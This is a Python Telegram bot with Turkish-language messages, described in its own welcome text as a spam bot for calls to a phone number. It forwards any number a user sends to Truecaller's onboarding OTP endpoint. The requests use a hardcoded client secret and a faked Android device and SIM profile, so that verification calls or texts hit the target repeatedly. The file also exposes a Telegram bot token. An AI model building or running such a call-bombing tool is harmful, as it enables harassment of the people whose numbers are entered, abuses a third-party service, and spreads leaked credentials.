import requests , hashlib
import random
import telebot
from telebot.types import InlineKeyboardButton as Btn , InlineKeyboardMarkup as Mak
import time

asa = '6477195227'
gigk = ''.join(random.choice(asa) for _ in range(10))

md5 = hashlib.md5(gigk.encode()).hexdigest()[:16]


token = "6746489788:AAH2g1f6ayG7rDB3kZNC062h2EGf6eoRo1M"
bot = telebot.TeleBot(token)


alokt = 0

@bot.message_handler(commands=['start'])
def start(message):
    name = message.from_user.first_name
    bot.reply_to(message, f'''Sevgili {name}, telefon numarası üzerinden yapılan aramalara yönelik spam botuna hoş geldiniz

 Telefon numarasını gönder
 Ülke koduyla birlikte +

 Örnek:
 +905357547867 ''',reply_markup=Mak().add(Btn('darkflesharsiv33',callback_data='click')))

def call(number):
    global alokt
    current_time = time.time()

    if current_time - alokt >= 60:
        alokt = current_time

        url = "https://account-asia-south1.truecaller.com/v3/sendOnboardingOtp"

        headers = {
            "Host": "account-asia-south1.truecaller.com",
            "content-type": "application/json; charset=UTF-8",
            "accept-encoding": "gzip",
            "user-agent": "Truecaller/12.34.8 (Android; 8.1.2)",
            "clientsecret": "lvc22mp3l1sfv6ujg83rd17btt"
        }

        data = {"countryCode": "eg","dialingCode": 20,"installationDetails": {"app": {"buildVersion": 8,"majorVersion": 12,"minorVersion": 34,"store": "GOOGLE_PLAY"},"device": {"deviceId": md5,"language": "ar","manufacturer": "Xiaomi","mobileServices": ["GMS"],"model": "Redmi Note 8A Prime","osName": "Android","osVersion": "7.1.2","simSerials": ["8920022021714943876f","8920022022805258505f"]},"language": "ar","sims": [{"imsi": "602022207634386","mcc": "602","mnc": "2","operator": "vodafone"},{"imsi": "602023133590849","mcc": "602","mnc": "2","operator": "vodafone"}],"storeVersion": {"buildVersion": 8,"majorVersion": 12,"minorVersion": 34}},"phoneNumber": number,"region": "region-2","sequenceNo": 1
    }

        req = requests.post(url, headers=headers, json=data).json()
        if req.get('status') == 40003:
            return 'Telefon numarası yanlış'
        else:
            phonum = req.get('parsedPhoneNumber')
            coucode = req.get('parsedCountryCode')
            text = f'''gönderildi
telefon numarası : {phonum} ✅
ülke kodu : {coucode} .'''
            return text
    else:
        remaining_time = int(60 - (current_time - alokt))
        return f'Botun tıklanmasını önlemek için lütfen {remaining_time} saniye bekleyin.'

@bot.message_handler(content_types=['text'])
def num(message):
    number = message.text
    spam = call(number)
    bot.reply_to(message,spam)

@bot.callback_query_handler(func=lambda call: call.data == 'click')
def all(call):
	bot.send_message(call.message.chat.id,'''
Chanal: @darkflesharsiv33 ''')

bot.polling()